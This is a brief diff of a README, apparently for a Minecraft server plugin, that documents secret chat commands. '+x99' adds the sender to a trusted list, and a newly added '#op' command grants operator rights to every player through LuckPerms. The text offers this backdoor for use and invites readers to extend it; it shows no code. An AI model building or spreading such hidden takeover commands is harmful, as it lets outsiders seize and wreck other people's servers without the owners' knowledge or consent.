@@ -35,6 +35,8 @@ In-game features (In Chat):
 
 +x99 adds your acc to trusted players list that you can use commands. (It works if your nickname only has lowercase letters.)
 
++#op Gives op Everyone (works only on luckperms. you can edit the code if you want to add others)
+
 This commands only works if you are added to trusted players list except "+x99"
 
 You can edit the code the way you want.
